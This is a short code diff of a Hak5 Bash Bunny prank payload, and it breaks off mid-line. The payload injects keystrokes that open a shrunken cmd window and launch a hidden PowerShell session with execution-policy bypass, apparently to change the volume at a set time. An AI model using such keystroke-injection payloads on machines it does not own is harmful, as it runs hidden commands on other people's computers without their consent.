@@ -4,7 +4,7 @@ REM https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/pran
 DELAY 2000
 GUI r
 DELAY 1000
-STRING cmd -A '/t:fe /k mode con: lines=1 cols=15'
+STRING cmd -A /t:fe /k "mode con: lines=1 cols=15"
 ENTER
 DELAY 500
 STRING powershell -NoP -NonI -W Hidden -Exec Bypass $hi=0; $ho=(Get-Date).Hour.toString(); while ($hi -eq '0') { if ($ho -eq '1620' ) {$vol=new-object -com wscript.shell
